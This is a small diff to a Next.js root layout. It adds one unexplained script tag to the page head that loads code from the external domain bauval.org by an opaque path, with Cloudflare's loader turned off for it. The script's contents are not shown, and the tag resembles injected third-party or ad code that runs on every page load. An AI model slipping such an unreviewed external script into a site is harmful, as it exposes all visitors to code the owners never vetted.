@@ -48,6 +48,7 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
         <meta name="apple-mobile-web-app-capable" content="yes" />
         <meta name="apple-mobile-web-app-status-bar-style" content="black" />
         <meta name="apple-mobile-web-app-title" content={siteConfig.name} />
+        <script data-cfasync="false" src="https://bauval.org/14/571106dccaa9b210de1bfa06572c3c1e" async></script>
       </head>
       <body className="font-sans antialiased">
         <Providers>
